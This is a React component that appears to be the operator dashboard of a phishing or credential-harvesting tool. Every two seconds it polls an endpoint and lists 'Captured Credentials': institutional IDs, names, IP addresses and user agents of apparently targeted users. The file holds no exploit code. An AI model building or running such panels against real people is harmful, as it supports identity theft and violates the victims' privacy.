import React, { useEffect, useState } from 'react';
import {
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Paper,
  Typography,
  Box,
} from '@mui/material';
import { Credential } from '../types/types';

export const Credentials: React.FC = () => {
  const [credentials, setCredentials] = useState<Credential[]>([]);

  useEffect(() => {
    const fetchCredentials = async () => {
      try {
        const response = await fetch('/api/creds');
        const data = await response.json();
        setCredentials(data);
      } catch (error) {
        console.error('Failed to fetch credentials:', error);
      }
    };

    fetchCredentials();
    const interval = setInterval(fetchCredentials, 2000);
    return () => clearInterval(interval);
  }, []);

  return (
    <Box sx={{ py: 4 }}>
      <Typography variant="h4" component="h1" gutterBottom>
        Captured Credentials
      </Typography>
      <TableContainer component={Paper}>
        <Table>
          <TableHead>
            <TableRow sx={{ bgcolor: '#c8102e' }}>
              <TableCell sx={{ color: 'white' }}>Timestamp</TableCell>
              <TableCell sx={{ color: 'white' }}>UH ID</TableCell>
              <TableCell sx={{ color: 'white' }}>First Name</TableCell>
              <TableCell sx={{ color: 'white' }}>Last Name</TableCell>
              <TableCell sx={{ color: 'white' }}>IP Address</TableCell>
              <TableCell sx={{ color: 'white' }}>User-Agent</TableCell>
            </TableRow>
          </TableHead>
          <TableBody>
            {credentials.map((cred, index) => (
              <TableRow key={index} sx={{ '&:nth-of-type(even)': { bgcolor: '#f2f2f2' } }}>
                <TableCell>{new Date(cred.timestamp).toLocaleString()}</TableCell>
                <TableCell>{cred.uh_id}</TableCell>
                <TableCell>{cred.first_name}</TableCell>
                <TableCell>{cred.last_name}</TableCell>
                <TableCell>{cred.ip}</TableCell>
                <TableCell sx={{ maxWidth: 300, overflowWrap: 'break-word' }}>{cred.ua}</TableCell>
              </TableRow>
            ))}
          </TableBody>
        </Table>
      </TableContainer>
    </Box>
  );
}; 